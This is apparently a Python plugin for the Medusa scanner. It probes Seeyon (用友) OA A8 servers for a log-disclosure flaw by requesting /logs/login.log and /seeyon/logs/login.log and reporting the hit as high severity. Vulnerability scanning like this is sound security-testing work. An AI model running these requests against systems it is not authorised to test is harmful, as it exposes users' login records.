#!/usr/bin/env python
# -*- coding: utf-8 -*-

import urllib
import requests
import re
import ClassCongregation
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number'] = "0"  # 如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['disclosure']='2019-10-13'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "Seeyou_a8_logs_disclosure"  # 插件名称
        self.info['name'] ='' #漏洞名称
        self.info['affects'] = "用友OA"  # 漏洞组件
        self.info['desc_content'] = "用友OAa8日志泄露漏洞"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['details'] = Medusa  # 结果
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payloads = ["/logs/login.log",
            "/seeyon/logs/login.log"]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    Medusas=[]
    try:
        for payload in payloads:
            payload_url = scheme+"://"+url+ ':' + str(port)+payload
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            #s = requests.session()
            # if ProxyIp!=None:
            #     proxies = {
            #         # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
            #         "http": "http://" + str(ProxyIp)
            #     }
            #     resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            # elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            pattern = re.search("[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}",con)
            if pattern:
                Medusa = "{} 存在用友a8 log泄露漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                _t = VulnerabilityInfo(Medusa)
                web = ClassCongregation.VulnerabilityDetails(_t.info)
                web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
                return (str(_t.info))
    except:
            _ = VulnerabilityInfo('').info.get('algroup')
            _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类